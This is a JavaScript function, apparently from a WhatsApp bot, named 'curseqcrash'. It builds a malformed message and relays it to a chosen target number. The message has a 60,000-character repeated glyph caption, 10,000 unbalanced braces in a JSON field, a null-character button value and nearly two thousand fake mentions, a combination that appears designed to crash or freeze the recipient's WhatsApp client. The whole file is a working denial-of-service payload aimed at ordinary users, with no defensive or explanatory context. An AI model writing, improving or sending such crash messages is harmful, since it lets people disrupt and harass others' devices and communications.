async function curseqcrash(target) {
    const mentionedList = [
    target, ...Array.from({ length: 1950 }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
      )
    ];
    
    try {
        const pnxMessage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: '1@newsletter',
                        newsletterName: "",
                        jpegThumbnail: null,
                        caption: "ꦾ".repeat(60000),
                        inviteExpiration: Date.now() + -99999999999.9,
                    },
                },
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
         buttons: [
           {
                   name: "galaxy_message",
                   buttonParamsJson: JSON.stringify({
                      icon: "REVIEW",
                      flow_cta: "\u0000",
                      flow_message_version: "3"
                   })
               }
         ]
            },
            contextInfo: {
              remoteJid: target,
              participant: target,
              mentionedJid: mentionedList,
              stanzaId: pnx.generateMessageTag(),
            },
        };

        await nexa.relayMessage(target, pnxMessage, {
          userJid: target,
        });
    } catch (error) {
        console.error("error:\n" + error);
    }
}
